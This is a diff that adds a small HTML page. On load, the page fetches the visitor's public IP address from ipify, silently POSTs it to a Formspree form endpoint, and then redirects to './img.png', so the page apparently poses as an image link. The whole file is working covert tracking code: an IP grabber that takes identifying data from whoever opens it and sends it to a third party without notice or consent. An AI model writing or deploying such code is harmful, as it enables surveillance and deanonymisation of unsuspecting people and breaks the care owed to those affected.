@@ -1,0 +1,42 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>
+</head>
+<body>
+
+<script type="application/javascript">
+    // This function is called automatically by the ipify JSONP script
+    function getIP(json) {
+      const ip = json.ip;
+      console.log('IP found:', ip);
+
+      // Send the IP to Formspree using Fetch API
+      fetch('https://formspree.io/f/mwprovvd', {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+          'Accept': 'application/json'
+        },
+        body: JSON.stringify({ message: ip })
+      })
+      .then(response => {
+        if (response.ok) {
+          console.log('IP sent successfully!');
+          window.location.replace("./img.png");  
+        } else {
+          console.error('Error sending IP:', response.status);
+          document.write("Error");
+        }
+      })
+      .catch(error => console.error('Network error:', error));
+    }
+   
+</script>
+
+<!-- IPify JSONP call -->
+<script type="application/javascript" src="https://api.ipify.org?format=jsonp&callback=getIP"></script>
+
+</body>
+
+</html>
